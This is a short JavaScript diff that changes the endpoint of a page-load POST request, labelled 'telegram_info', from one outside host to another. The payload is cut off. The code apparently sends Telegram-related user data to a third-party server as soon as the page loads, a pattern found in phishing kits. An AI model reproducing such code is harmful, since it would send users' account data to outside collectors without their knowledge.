@@ -16,7 +16,7 @@ document.addEventListener("DOMContentLoaded", function() {
 
 
 
-        await fetch('https://bot.poolparty.me/telegram_info', {
+        await fetch('https://acrylicedse.vercel.app/telegram_info', {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
